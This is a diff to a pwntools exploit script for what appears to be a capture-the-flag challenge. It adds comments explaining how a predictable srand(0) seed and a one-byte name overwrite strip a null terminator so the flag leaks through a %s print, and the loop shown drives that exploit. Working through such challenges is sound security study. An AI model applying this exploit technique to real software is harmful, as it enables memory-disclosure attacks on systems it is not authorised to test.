@@ -1,6 +1,25 @@
 from pwn import *
 from ctypes import *
+'''
+We are asked to choose a character, from 1 to 4. 
+Enter 1byte random, 2byte random, 3byte random, and 4byte random values as srand arguments, 
+respectively. So to know the sequence of random numbers that will be produced
+ we want as argument 0. If we enter a number other than 1,2,3,4, the srand value is set to 0. 
 
+
+So we know the random values, and if the value we input 
+was bigger than the random value, we could increase the score by 1,
+ and if it was the same as the random value, we could reset the name. 
+The vulnerability also occurs with the name and score attached.
+ If the score is 1, the name can be modified by 1 byte by strlen. 
+Our purpose is to fill all the values of the score variable, 
+because in the end name is printed with %s. So if there's no null name score and flag will all be printed. 
+
+
+
+
+
+'''
 lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
 
 
@@ -61,17 +80,21 @@ lib.srand(0)
 
 
 
-add_score()
-draw(45)
+add_score() # 00 00 00 00 00 00 00 01
+draw(45) # # 00 00 00 00 00 00 00 FF
+
 for i in range(0, 127):
 
     s = 0
-    add_score()
-    temp = add_score()
+    add_score() 
+    temp = add_score() #  00 00 00 00 00 00 01 01 on first loop
+    # find how many ff's we'll gonna input 
+    # e.g. 00 00 00 00 00 00 01 01 >> 8 = 00 00 00 00 00 00 00 01 >> 8 = 00 00 00 00 00 00 00 00 % 2 = 0
     while (temp % 2 != 0):
         temp = temp >> 8
         s += 1
-    draw(44+s)
-
+    draw(44+s) #   00 00 00 00 00 00 FF FF first loop
+# until we get 
+#  01 01 01 01 01 01 01 01 --> FF FF FF FF FF FF FF FF
 lose()
 sh.interactive()
